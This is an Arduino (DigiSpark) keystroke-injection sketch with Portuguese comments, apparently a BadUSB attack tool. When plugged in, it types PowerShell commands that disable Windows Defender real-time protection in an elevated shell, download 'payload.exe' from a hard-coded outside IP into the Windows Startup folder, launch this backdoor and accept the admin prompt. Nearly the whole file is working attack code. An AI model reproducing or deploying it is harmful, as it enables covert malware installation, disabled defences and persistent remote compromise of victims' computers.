#include "DigiKeyboard.h"
#define KEY_UP_ARROW     0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW  0x4F
#define KEY_LEFT_GUI     0xE3
#define KEY_ESC          0x29
#define KEY_HOME         0x4A
#define KEY_INSERT       0x49
#define KEY_NUM_LOCK     0x53
#define KEY_SCROLL_LOCK  0x47
#define KEY_CAPS_LOCK    0x39
#define KEY_TAB          0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0, 0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led = 1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void disabledWindowsDefender(){
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  // Iniciar uma instância do PowerShell elevada que desabilitará o Windows Defender
  printText(F("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
}


void download(){
  // Fazer o download o backdoor para a pasta de inicialização do windows
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(900);
  printText(F("powershell  $source = 'http://34.97.212.80/payload.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
}

void runBackdoor(){
  //tentar iniciar o backdoor
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  printText(F("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"));
  //powershell start-process
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void printText(fstr_t *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

 
void yesAdmin(){
  // se você precisar de administrador [esquerda, digite e atrase 1000]
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  ////////////////////////////////////////////////////////////////////////
}

void setup() {
  digiBegin();
 

  disabledWindowsDefender();
  download();
  runBackdoor();
  yesAdmin();
  
  printText(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  digiEnd();
}

/* Unused endless loop */
void loop() {}
